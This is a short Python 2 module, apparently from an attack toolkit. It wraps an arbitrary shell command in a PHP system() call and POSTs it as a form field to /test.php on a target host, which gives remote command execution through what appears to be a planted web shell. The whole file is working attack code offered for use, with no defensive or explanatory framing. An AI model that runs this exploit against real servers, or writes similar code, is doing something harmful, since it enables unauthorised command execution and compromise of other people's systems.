#!/usr/bin/env python
# -*- coding: utf-8 -*-

from config import *
from sys_payload import  *
import os
import httplib
import urllib





# example of payload
def run(target,payload,extend):
		
	def http(method,host,port,url,data):
		#print host
		con = httplib.HTTPConnection(host,port,timeout=20)
		if method=='post' or method=='POST':
			headers['Content-Length'] = len(data)
			con.request("POST",url,data,headers = headers)
		else:
			con.request("GET",url,headers = headers)
		return con.getresponse().read()
	
	headers={'Host': target,
                 'Content-Type': 'application/x-www-form-urlencoded',}
	target = target
	if payload:
		payload = sys_payload_array[payload]
	else:
		payload = extend
	payload_real = 'system("'+payload+'");'
	
	data = urllib.urlencode({'222':payload_real})
	return http('post',target,80,'/test.php',data)

	
